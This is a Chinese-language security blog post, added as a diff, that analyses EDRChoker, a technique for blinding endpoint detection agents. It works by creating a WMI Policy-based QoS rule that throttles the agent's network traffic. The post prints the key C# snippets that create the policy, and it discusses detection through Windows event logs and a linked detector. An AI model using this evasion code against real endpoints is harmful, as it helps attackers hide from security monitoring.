@@ -1,0 +1,179 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>新型流量侧致盲EDR Agent技术EDRChoker解析 | 卡卡罗特取西经</title><meta name="author" content="ybdt"><meta name="copyright" content="ybdt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x01 前言2713这兄弟又公开新姿势了 https:&#x2F;&#x2F;www.zerosalarium.com&#x2F;2026&#x2F;06&#x2F;edrchoker-choking-telemetry-stream-block-edr.htmlhttps:&#x2F;&#x2F;github.com&#x2F;TwoSevenOneT&#x2F;EDRChoker 借助Policy-based QoS限制EDR Agent和EDR Server之间的流量交互，表面">
+<meta property="og:type" content="article">
+<meta property="og:title" content="新型流量侧致盲EDR Agent技术EDRChoker解析">
+<meta property="og:url" content="http://example.com/2026/06/10/%E6%96%B0%E5%9E%8B%E6%B5%81%E9%87%8F%E4%BE%A7%E8%87%B4%E7%9B%B2EDR-Agent%E6%8A%80%E6%9C%AFEDRChoker%E8%A7%A3%E6%9E%90/index.html">
+<meta property="og:site_name" content="卡卡罗特取西经">
+<meta property="og:description" content="0x01 前言2713这兄弟又公开新姿势了 https:&#x2F;&#x2F;www.zerosalarium.com&#x2F;2026&#x2F;06&#x2F;edrchoker-choking-telemetry-stream-block-edr.htmlhttps:&#x2F;&#x2F;github.com&#x2F;TwoSevenOneT&#x2F;EDRChoker 借助Policy-based QoS限制EDR Agent和EDR Server之间的流量交互，表面">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2026-06-10T06:56:15.000Z">
+<meta property="article:modified_time" content="2026-06-10T07:02:00.792Z">
+<meta property="article:author" content="ybdt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/06/10/%E6%96%B0%E5%9E%8B%E6%B5%81%E9%87%8F%E4%BE%A7%E8%87%B4%E7%9B%B2EDR-Agent%E6%8A%80%E6%9C%AFEDRChoker%E8%A7%A3%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '新型流量侧致盲EDR Agent技术EDRChoker解析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-10 15:02:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="卡卡罗特取西经" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="卡卡罗特取西经"><span class="site-name">卡卡罗特取西经</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">新型流量侧致盲EDR Agent技术EDRChoker解析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-06-10T06:56:15.000Z" title="Created 2026-06-10 14:56:15">2026-06-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-06-10T07:02:00.792Z" title="Updated 2026-06-10 15:02:00">2026-06-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="新型流量侧致盲EDR Agent技术EDRChoker解析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>2713这兄弟又公开新姿势了</p>
+<p><a target="_blank" rel="noopener" href="https://www.zerosalarium.com/2026/06/edrchoker-choking-telemetry-stream-block-edr.html">https://www.zerosalarium.com/2026/06/edrchoker-choking-telemetry-stream-block-edr.html</a><br><a target="_blank" rel="noopener" href="https://github.com/TwoSevenOneT/EDRChoker">https://github.com/TwoSevenOneT/EDRChoker</a></p>
+<p>借助Policy-based QoS限制EDR Agent和EDR Server之间的流量交互，表面是借助Policy-based QoS，实际上Policy-based QoS会调用内核中的NDIS LWF（NDIS轻量级过滤器，功能实现位于驱动pacer.sys中），NDIS LWF位于WFP的更底层，所以可以绕过EDR对流量的审查（EDR对流量的审查通常在WFP层，功能实现位于驱动tpcip.sys中），在流量上致盲EDR Agent，</p>
+<p>网络流量从上到下，流经的各层如下：<br>应用层 (Sockets) -&gt; TDI/Wsk (传输内核) -&gt; tcpip.sys (传输层) -&gt; NDIS LWF (pacer.sys 所在层) -&gt; NDIS Miniport (网卡驱动) -&gt; 物理硬件</p>
+<p>NDIS是什么？<br>Network Device Interface Specification，网络设备接口规范，是微软 Windows 操作系统中定义的一套网络架构标准，它就像一个“翻译官”或“中介”。在它之上，是各种网络协议（如 TCP/IP）；在它之下，是各种各样不同厂家生产的网卡驱动（Miniport Driver），有了 NDIS，写 TCP/IP 协议的人不需要关心用户用的是华为、Realtek 还是 Intel 的网卡；而写网卡驱动的人也不必去关心系统跑的是什么协议。大家都和 NDIS 接口对接即可</p>
+<h1 id="0x02-WMI是什么"><a href="#0x02-WMI是什么" class="headerlink" title="0x02 WMI是什么"></a>0x02 WMI是什么</h1><p>WMI，全称：Windows Management Instrumentation，译为：Windows管理规范</p>
+<p>可以把它理解成一个巨大的系统信息与配置数据库，我们可以：<br> 查询系统信息：CPU型号、硬盘序列号、正在运行的进程、服务列表、事件日志……<br> 修改系统设置：更改QoS限速策略、创建WMI事件监控、调用系统方法……</p>
+<h1 id="0x03-如何访问WMI"><a href="#0x03-如何访问WMI" class="headerlink" title="0x03 如何访问WMI"></a>0x03 如何访问WMI</h1><p>WMI技术基于COM，所以如果想用C++调用WMI，其实是C++ COM编程，比较繁琐</p>
+<p>C#中直接封装了COM对象的交互，可通过System.Management命名空间下的类（如：ManagementScope、ManagementClass、ManagementObject等）来与WMI交互</p>
+<h1 id="0x04-关键代码讲解"><a href="#0x04-关键代码讲解" class="headerlink" title="0x04 关键代码讲解"></a>0x04 关键代码讲解</h1><p>整个程序代码相对简单，只有2个CSharp文件：Program.cs和Utils.cs，Utils.cs中的代码做了3件事：从文件中读取进程名、输出Banner、判断是否是Admin权限，都是常规编程内容</p>
+<p>Program.cs中做了2件事：创建QoS策略，清除QoS策略，重点是如何创建和清除QoS策略，我们看下关键代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var managementScope = new ManagementScope(@&quot;\\.\ROOT\StandardCimv2&quot;);</span><br><span class="line">managementScope.Connect();</span><br><span class="line"></span><br><span class="line">\\.\                 -&gt; 表示本机</span><br><span class="line">ROOT\StandardCimv2   -&gt; 这是管理现代网络、存储等操作系统标准化设置的新区域，引入了许多遵循新标准（CIM）的类</span><br><span class="line">ROOT\SecurityCenter2 -&gt; 这个区域用来管理Windows安全中心的信息，如防火墙、杀毒软件等</span><br><span class="line">ROOT\MicrosoftDNS    -&gt; 这里专门存放与DNS服务器相关的管理信息，如果你的计算机安装了DNS服务器角色，就可以在这里查询相关信息</span><br><span class="line">ROOT\CIMv2           -&gt; 这是WMI中最常用的命名空间，它包含了管理Windows操作系统、硬件和绝大多数软件所需的核心类，比如 Win32_Process（进程）、Win32_Service（服务）、Win32_LogicalDisk（逻辑磁盘）和 Win32_Product（软件产品）等。这个区域非常庞大，拥有超过1000个预定义的 WMI 类，是进行常规系统管理任务最常用的地方</span><br><span class="line"></span><br><span class="line">还有很多这样的命令空间，不一一列举，总之这里用到的是 ROOT\StandardCimv2</span><br></pre></td></tr></table></figure>
+<p>创建特定命名空间的实例，并进入这个命名空间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var managementPath = new ManagementPath(&quot;MSFT_NetQosPolicySettingData&quot;);</span><br><span class="line">var policyClass = new ManagementClass(managementScope, managementPath, null);</span><br><span class="line">ManagementObject newPolicy = policyClass.CreateInstance();</span><br><span class="line"></span><br><span class="line">还有 MSFT_NetAdapter_QosSettings、MSFT_NetAdapterQosElementSetting等等类，这里用到的是 MSFT_NetQosPolicySettingData</span><br></pre></td></tr></table></figure>
+<p>创建类MSFT_NetQosPolicySettingData的实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">newPolicy[&quot;Owner&quot;] = 1;</span><br><span class="line">string guid = Guid.NewGuid().ToString();</span><br><span class="line">string policyName = Path.GetRandomFileName().Replace(&quot;.&quot;, &quot;&quot;).Substring(0, 8);</span><br><span class="line">newPolicy[&quot;Name&quot;] = policyName;</span><br><span class="line">newPolicy[&quot;InstanceID&quot;] = $&quot;&#123;guid&#125;\\&#123;policyName&#125;\\ActiveStore&quot;;</span><br><span class="line">newPolicy[&quot;AppPathNameMatchCondition&quot;] = procName;</span><br><span class="line">newPolicy[&quot;IPProtocolMatchCondition&quot;] = 3U;</span><br><span class="line">newPolicy[&quot;NetworkProfile&quot;] = 0U;</span><br><span class="line">newPolicy[&quot;ThrottleRateAction&quot;] = 8UL;</span><br></pre></td></tr></table></figure>
+<p>为这个实例设置各种属性（其实就是为这个Policy设置各种参数），包括策略名称、策略ID、要限速的进程名称、限速多少等等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var putOptions = new PutOptions</span><br><span class="line">&#123;</span><br><span class="line">    Type = PutType.CreateOnly</span><br><span class="line">&#125;;</span><br><span class="line">newPolicy.Put(putOptions);</span><br></pre></td></tr></table></figure>
+<p>将实例写入WMI存储库（应用策略）</p>
+<h1 id="0x05-尾语"><a href="#0x05-尾语" class="headerlink" title="0x05 尾语"></a>0x05 尾语</h1><p>流量侧致盲EDR Agent，最开始是借助防火墙，但创建防火墙规则会被Windows审计系统记录，产生ID为2004的日志，再结合拦截的进程为EDR Agent，可以断定为恶意攻击</p>
+<p>接着出现调用WFP的API致盲EDR Agent，但同样也会被Windows审计系统记录，产生ID为5157的日志，再结合拦截的进程为EDR Agent，可以断定为恶意攻击</p>
+<p>现在出现了Policy-based QoS致盲EDR Agent，由于这项技术是限制EDR Agent的速度，并不是丢弃EDR Agent的数据包，所以不会产生上述的类型的日志，但是可以通过监测组策略或WMI的方式来检测这项攻击，已经有人做了这项工作<br><a target="_blank" rel="noopener" href="https://github.com/sbousseaden/EDRUnChoker">https://github.com/sbousseaden/EDRUnChoker</a></p>
+<p>由此也引发，如果想研究一个新的流量侧的致盲EDR Agent，可以研究NDIS LWF层的其他功能，或者继续往底层研究，NDIS Miniport层，甚至脱离Windows操作系统，针对网卡固件的攻击</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">ybdt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/06/10/%E6%96%B0%E5%9E%8B%E6%B5%81%E9%87%8F%E4%BE%A7%E8%87%B4%E7%9B%B2EDR-Agent%E6%8A%80%E6%9C%AFEDRChoker%E8%A7%A3%E6%9E%90/">http://example.com/2026/06/10/%E6%96%B0%E5%9E%8B%E6%B5%81%E9%87%8F%E4%BE%A7%E8%87%B4%E7%9B%B2EDR-Agent%E6%8A%80%E6%9C%AFEDRChoker%E8%A7%A3%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2026/05/28/AdaptixC2%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/" title="AdaptixC2客户端编译踩坑"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">AdaptixC2客户端编译踩坑</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ybdt</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ybdt"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">要想练就绝世武功，就要忍受常人难忍受的痛</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-WMI%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.</span> <span class="toc-text">0x02 WMI是什么</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%A6%82%E4%BD%95%E8%AE%BF%E9%97%AEWMI"><span class="toc-number">3.</span> <span class="toc-text">0x03 如何访问WMI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E8%AE%B2%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">0x04 关键代码讲解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%B0%BE%E8%AF%AD"><span class="toc-number">5.</span> <span class="toc-text">0x05 尾语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/10/%E6%96%B0%E5%9E%8B%E6%B5%81%E9%87%8F%E4%BE%A7%E8%87%B4%E7%9B%B2EDR-Agent%E6%8A%80%E6%9C%AFEDRChoker%E8%A7%A3%E6%9E%90/" title="新型流量侧致盲EDR Agent技术EDRChoker解析">新型流量侧致盲EDR Agent技术EDRChoker解析</a><time datetime="2026-06-10T06:56:15.000Z" title="Created 2026-06-10 14:56:15">2026-06-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/28/AdaptixC2%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/" title="AdaptixC2客户端编译踩坑">AdaptixC2客户端编译踩坑</a><time datetime="2026-05-28T12:35:03.000Z" title="Created 2026-05-28 20:35:03">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/13/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%88%B0SYSTEM%E6%9D%83%E9%99%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="Windows权限提升高级利用技术之任意文件读到SYSTEM权限代码执行">Windows权限提升高级利用技术之任意文件读到SYSTEM权限代码执行</a><time datetime="2026-05-13T13:21:05.000Z" title="Created 2026-05-13 21:21:05">2026-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/21/%E6%96%B0%E5%9E%8B%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85%E6%8A%80%E6%9C%AF%E4%B9%8BWinGet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-Lnk%E6%96%87%E4%BB%B6/" title="新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件">新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件</a><time datetime="2026-04-21T09:48:37.000Z" title="Created 2026-04-21 17:48:37">2026-04-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/06/CVE-2026-24291-Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E2%80%9CRegPwn%E2%80%9D%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="CVE-2026-24291-Windows权限提升漏洞“RegPwn”复现分析">CVE-2026-24291-Windows权限提升漏洞“RegPwn”复现分析</a><time datetime="2026-04-06T11:47:47.000Z" title="Created 2026-04-06 19:47:47">2026-04-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By ybdt</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
